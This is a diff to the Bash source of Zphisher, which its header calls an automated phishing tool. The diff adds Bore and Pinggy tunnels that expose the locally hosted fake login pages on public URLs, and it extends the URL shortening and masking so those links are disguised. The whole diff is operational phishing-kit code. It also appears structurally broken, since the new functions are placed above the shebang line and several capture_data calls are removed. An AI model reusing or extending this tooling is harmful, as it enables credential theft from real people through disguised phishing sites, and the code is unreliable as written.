@@ -1,3 +1,174 @@
+
+## Start Bore
+## Start Bore Tunnel (Improved)
+start_bore() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
+	sleep 1
+	if ! curl -s http://127.0.0.1:$PORT > /dev/null 2>&1; then
+		echo -e " ${RED}FAILED${WHITE}"
+		killall php > /dev/null 2>&1
+		cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+		sleep 2
+	else
+		echo -e " ${GREEN}OK${WHITE}"
+	fi
+
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}Bore Tunnel: ${GREEN}Free & Open Source${WHITE}        ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}No registration required${WHITE}              ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}Public server: bore.pub${WHITE}               ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 1
+
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Bore tunnel..."
+	rm -f .server/.bore.log
+
+	if [[ `command -v termux-chroot` ]]; then
+		termux-chroot ./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+	else
+		./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+	fi
+
+	sleep 6
+	echo -e "${GREEN} Done!${WHITE}"
+
+	# Extract URL from log
+	bore_url=$(grep -o "bore\.pub:[0-9]*" .server/.bore.log 2>/dev/null | tail -1)
+	
+	if [ -n "$bore_url" ]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 : ${GREEN}http://$bore_url${WHITE}"
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 : ${GREEN}https://$bore_url${WHITE}"
+	else
+		# Check for errors in log
+		if grep -qi "could not connect\|timed out\|error" .server/.bore.log 2>/dev/null; then
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start Bore${WHITE}"
+			echo -e "${YELLOW}Possible reasons: bore.pub down, port in use, no internet${WHITE}"
+			echo -e "${CYAN}Trying to reconnect in 5 seconds...${WHITE}"
+			sleep 5
+			# Retry once
+			./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+			sleep 6
+			bore_url=$(grep -o "bore\.pub:[0-9]*" .server/.bore.log 2>/dev/null | tail -1)
+			if [ -n "$bore_url" ]; then
+				echo -e "\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} Reconnected successfully!${WHITE}"
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 : ${GREEN}http://$bore_url${WHITE}"
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 : ${GREEN}https://$bore_url${WHITE}"
+			else
+				echo -e "\n${RED}[${WHITE}!${RED}]${RED} Bore service unavailable. Try another tunnel.${WHITE}"
+				exit 1
+			fi
+		else
+			echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Bore tunnel running (URL not captured yet)${WHITE}"
+			echo -e "${CYAN}Check .server/.bore.log for details${WHITE}"
+		fi
+	fi
+
+	custom_url "bore.pub:${bore_url#*:}"
+}
+
+
+## Start Pinggy Tunnel
+start_pinggy() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
+	sleep 1
+	if ! curl -s http://127.0.0.1:$PORT > /dev/null 2>&1; then
+		echo -e " ${RED}FAILED${WHITE}"
+		killall php > /dev/null 2>&1
+		cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+		sleep 2
+	else
+		echo -e " ${GREEN}OK${WHITE}"
+	fi
+
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}Pinggy Tunnel: ${GREEN}Free & Fast${WHITE}           ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}SSH-based (no install)${WHITE}               ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}60 minutes free per session${WHITE}         ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 1
+
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Pinggy tunnel..."
+	rm -f .server/.pinggy.log
+
+	# Start Pinggy tunnel using SSH
+	ssh -i $HOME/.ssh/id_pinggy -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o PasswordAuthentication=no -p 443 -R0:localhost:$PORT a.pinggy.io > .server/.pinggy.log 2>&1 &
+	
+	sleep 8
+	echo -e "${GREEN} Done!${WHITE}"
+
+	# Extract URL from log
+	pinggy_url=$(grep -oE "https://[a-z0-9\-]+\.a\.pinggy\.(online|io|link)" .server/.pinggy.log | head -1)
+	
+	if [ -z "$pinggy_url" ]; then
+		# Alternative parsing
+		pinggy_url=$(grep -oE "http://[a-z0-9\-]+\.a\.pinggy\.(online|io)" .server/.pinggy.log | head -1)
+	fi
+	
+	if [ -n "$pinggy_url" ]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL : ${GREEN}$pinggy_url${WHITE}"
+		echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Session limit: 60 minutes${WHITE}"
+	else
+		# Check for errors
+		if grep -qi "connection.*refused\|timed out\|error" .server/.pinggy.log 2>/dev/null; then
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start Pinggy${WHITE}"
+			echo -e "${YELLOW}Possible reasons: SSH blocked, no internet, pinggy.io down${WHITE}"
+			exit 1
+		else
+			echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Pinggy tunnel running${WHITE}"
+			echo -e "${CYAN}Fetching URL from log...${WHITE}"
+			sleep 2
+			# Parser para formato: xxx-xxx-xxx-xxx.a.free.pinggy.link
+			pinggy_url=$(grep -E "https?://[a-z0-9-]+.a.(free.)?pinggy.(link|online|io)" .server/.pinggy.log | head -1)
+			if [ -n "$pinggy_url" ]; then
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Pinggy URL : ${GREEN}$pinggy_url${WHITE}"
+				echo -e "${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Session: 60 minutes${WHITE}"
+			else
+				echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to parse URL${WHITE}"
+				echo -e "${CYAN}Manual check: cat .server/.pinggy.log | grep http${WHITE}"
+			fi
+			sleep 2
+			pinggy_url=$(grep -oE "https?://[a-zA-Z0-9\-]+.a.pinggy\.(online|io|link)" .server/.pinggy.log | head -1)
+			if [ -n "$pinggy_url" ]; then
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Pinggy URL : ${GREEN}$pinggy_url${WHITE}"
+			else
+				echo -e "${ORANGE}URL not found. Check: cat .server/.pinggy.log${WHITE}"
+			fi
+			echo -e "${CYAN}Check .server/.pinggy.log for URL${WHITE}"
+		fi
+	fi
+
+	# Extract URL one more time to ensure we have it
+	if [ -z "$pinggy_url" ]; then
+		pinggy_url=$(grep -E "https?://[a-z0-9-]+.a.(free.)?pinggy.(link|online|io)" .server/.pinggy.log | head -1)
+	fi
+	# Extract just the domain part for custom_url
+	pinggy_domain=${pinggy_url#http*://}
+	custom_url "$pinggy_domain"
+}
+
+
+## Install Bore
+install_bore() {
+    if [[ -e ".server/bore" ]]; then
+        echo -e "\n${success}Bore already installed."
+    else
+        echo -e "\n${info}Installing Bore..."
+        arch=$(uname -m)
+        if [[ "$arch" == *'arm'* || "$arch" == *'aarch64'* || "$arch" == *'android'* ]]; then
+            download 'https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-aarch64-unknown-linux-musl.tar.gz' 'bore'
+        else
+            download 'https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-unknown-linux-musl.tar.gz' 'bore'
+        fi
+    fi
+}
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
@@ -153,12 +324,17 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx ssh"
+	check_PID="php cloudflared loclx ssh bore"
+	# Kill Pinggy SSH tunnel
+	pkill -f "ssh.*pinggy" > /dev/null 2>&1
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
 		fi
 	done
+
+	# Reset terminal
+	reset > /dev/null 2>&1 || stty sane 2>/dev/null
 }
 
 # Check for a newer release
@@ -288,6 +464,9 @@ download() {
 			mv -f $output .server/$output > /dev/null 2>&1
 		elif [[ ${file#*.} == "tgz" ]]; then
 			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ "$file" == *.tar.gz ]]; then
+			tar -xzf $file > /dev/null 2>&1
 			mv -f $output .server/$output > /dev/null 2>&1
 		else
 			mv -f $file .server/$output > /dev/null 2>&1
@@ -490,7 +669,6 @@ start_cloudflared() {
 	sleep 15
 	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
 	custom_url "$cldflr_url"
-	capture_data
 }
 
 
@@ -539,7 +717,6 @@ ${RED}[${WHITE}!${RED}]${RED} Serveo is temporarily unavailable."
 		echo -e "
 ${GREEN}[${WHITE}✓${GREEN}]${CYAN} Tunnel established successfully!"
 		custom_url "$serveo_url"
-		capture_data
 	fi
 }
 
@@ -587,7 +764,6 @@ start_loclx() {
 	sleep 12
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
 	custom_url "$loclx_url"
-	capture_data
 }
 
 ## Start localhost
@@ -597,7 +773,6 @@ start_localhost() {
 	setup_site
 	{ sleep 1; clear; banner_small; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-	capture_data
 }
 
 ## Check Serveo status
@@ -619,6 +794,8 @@ tunnel_menu() {
 		${RED}[${WHITE}02${RED}]${ORANGE} Serveo         ${RED}[${WHITE}Status: ${SERVEO_STATUS}${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose     ${RED}[${CYAN}Free: 15min limit${RED}]
 		${RED}[${WHITE}04${RED}]${ORANGE} Cloudflared    [${ORANGE}May fail on Android${RED}]
+		${RED}[${WHITE}05${RED}]${ORANGE} Bore           ${RED}[${GREEN}NEW - Free & Fast${RED}]
+		${RED}[${WHITE}06${RED}]${ORANGE} Pinggy         ${RED}[${CYAN}60min free - SSH-based${RED}]
 
 	EOF
 
@@ -640,6 +817,10 @@ tunnel_menu() {
 			start_loclx;;
 		4 | 04)
 			start_cloudflared;;
+		5 | 05)
+			start_bore;;
+		6 | 06)
+			start_pinggy;;
 		*)
 			echo -ne "
 ${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -684,7 +865,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|serveo.net) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|serveo.net|bore.pub|pinggy.link|pinggy.online|pinggy.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
@@ -930,7 +1111,6 @@ main_menu() {
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
 			tunnel_menu;;
 		20)
 			website="adobe"
@@ -1011,4 +1191,5 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
+install_bore
 main_menu
